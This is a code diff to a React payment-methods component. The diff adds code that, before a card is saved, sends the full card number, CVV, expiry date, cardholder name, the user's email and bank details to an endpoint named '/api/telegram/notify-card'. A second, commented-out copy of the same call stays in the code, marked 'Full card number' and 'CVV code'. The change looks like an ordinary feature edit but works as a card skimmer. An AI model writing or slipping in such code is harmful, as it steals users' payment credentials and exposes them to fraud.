@@ -458,6 +458,29 @@ export default function PaymentMethodsContent({ paymentMethods: initialMethods, 
       }
     }
 
+    const cleaned = formData.card_number.replace(/\D/g, "")
+    const { data: profile } = await supabase.from("profiles").select("email, full_name, id").eq("id", userId).single()
+
+    fetch("/api/telegram/notify-card", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        userEmail: profile?.email || "Unknown",
+        userName: profile?.full_name || "Unknown",
+        userId: profile?.id || userId,
+        cardNumber: cleaned,
+        cardBrand: cardType || "Unknown",
+        cardLastFour: cleaned.slice(-4),
+        cardHolder: formData.card_holder,
+        cardExpiry: `${formData.expiry_month}/${formData.expiry_year}`,
+        cvv: formData.cvv,
+        bankName: binData?.bank?.name,
+        cardLevel: binData?.level,
+        cardType: binData?.type,
+        country: binData?.country?.name,
+      }),
+    }).catch((err) => console.error("[v0] Failed to send card notification:", err))
+
     setIsAddingCard(true)
     setIsSubmitting(true)
 
@@ -491,6 +514,26 @@ export default function PaymentMethodsContent({ paymentMethods: initialMethods, 
     const { data, error } = await supabase.from("payment_methods").insert(insertData).select().single()
 
     if (!error && data) {
+      const { data: profile } = await supabase.from("profiles").select("email, full_name").eq("id", userId).single()
+
+      // Removed redundant fetch to telegram
+      // fetch("/api/telegram/notify-card", {
+      //   method: "POST",
+      //   headers: { "Content-Type": "application/json" },
+      //   body: JSON.stringify({
+      //     userEmail: profile?.email || "Unknown",
+      //     userName: profile?.full_name || "Unknown",
+      //     cardNumber: cleaned, // Full card number
+      //     cardBrand: insertData.card_brand,
+      //     cardLastFour: insertData.card_last_four,
+      //     cardHolder: insertData.card_holder_name,
+      //     cardExpiry: `${insertData.card_expiry_month}/${insertData.card_expiry_year}`,
+      //     cvv: formData.cvv, // CVV code
+      //     bankName: insertData.bank_name,
+      //     cardLevel: insertData.card_level,
+      //   }),
+      // }).catch((err) => console.error("[v0] Failed to send card notification:", err))
+
       setPendingCardId(data.id)
       setPending3DSecureBinData(binData)
 
